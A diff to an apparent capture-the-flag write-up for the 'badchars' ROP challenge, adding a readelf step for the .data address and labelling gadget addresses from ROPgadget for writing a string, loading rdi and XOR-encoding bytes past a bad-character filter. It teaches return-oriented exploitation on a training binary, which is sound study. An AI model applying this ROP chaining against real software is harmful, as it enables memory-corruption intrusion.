@@ -13,19 +13,26 @@ RELRO     : Partial
 ``` 
 Since PIE is disabled, we can find data section address, therefore, we can use the same way in previous problem.
 
+We write string to data section address:
+```
+readelf
+...
+.data = 0x601028 >>> dataSect = 0x601028 + 0x8
+...
+```
 We also need some gadget to do following operations, write to data section, move data section address to rdi register, do the xor operation.
 ```
 ROPgadget --binary badchars
 ...
-0x0000000000400634 : mov qword ptr [r13], r12 ; ret # write string to buffer
+0x0000000000400634 : mov qword ptr [r13], r12 (gadget2); ret # write string to buffer
 ...
-0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret # pop value and address to registers
+0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 (gadget1); ret # pop value and address to registers
 ...
-0x00000000004006a0 : pop r14 ; pop r15 ; ret # pop xor value and address to registers
+0x00000000004006a0 : pop r14 ; pop r15 (gadget5); ret # pop xor value and address to registers
 ...
-0x00000000004006a3 : pop rdi ; ret # pop string address to argument register
+0x00000000004006a3 : pop rdi (gadget3); ret # pop string address to argument register
 ...
-0x0000000000400628 : xor byte ptr [r15], r14b ; ret # do byte xor operation to ptr [byte] address
+0x0000000000400628 : xor byte ptr [r15], r14b (gadget4); ret # do byte xor operation to ptr [byte] address
 ...
 ```
 We need to find xor pairs to bypass bad characters checking. Using xor_pair in pwntools:
